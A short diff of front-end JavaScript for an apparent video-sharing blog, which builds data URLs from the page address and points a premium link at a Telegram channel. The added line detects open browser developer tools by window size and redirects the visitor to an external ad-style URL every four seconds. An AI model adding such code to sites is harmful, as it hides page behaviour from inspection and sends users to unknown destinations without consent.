@@ -2,6 +2,7 @@ const IdCode = window.location.href.replace(/ht.+de=/,"").replace("#","").replac
 const DoHost = window.location.protocol+'//'+window.location.hostname+window.location.pathname.replace('premium','');
 const DtcPrm = window.location.href.includes('premium'), bImgA = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/', bImgB = '/w640-h386-c-rw/Thumbnail.webp'; 
 if (DtcPrm==false) {$('#premiumvideo').each(function(){$(this).attr("href", "https://t.me/blogmeat2/1321");}); } 
+function detectDevTools() { if ( window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200 ) { window.location.href = 'https://s.zlinkb.com/d.php?z=4836662'; }} setInterval(detectDevTools, 4000);
 const apiUrl = `${DoHost}data/${IdCode}.json`,
     resultContainer = document.getElementById("result-container");
 fetch(apiUrl).then((t => {
